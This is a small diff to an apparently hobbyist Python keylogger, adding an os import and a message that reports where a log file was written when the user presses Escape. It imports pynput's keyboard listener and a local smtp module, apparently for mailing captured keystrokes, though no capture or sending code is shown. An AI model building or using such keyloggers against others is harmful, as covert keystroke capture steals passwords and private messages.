@@ -1,6 +1,7 @@
 # packages
 from pynput.keyboard import Listener
 import sys
+import os
 # files project
 from smtp import smtp
 from validations import validations
@@ -8,6 +9,7 @@ from header import header
 
 # cancel script if pressed esc
 def cancel():
+  print("A log file has been created in: {}\\tmp".format(os.path.dirname(os.path.realpath(__file__))))
   exit()
 
 # start keylogger
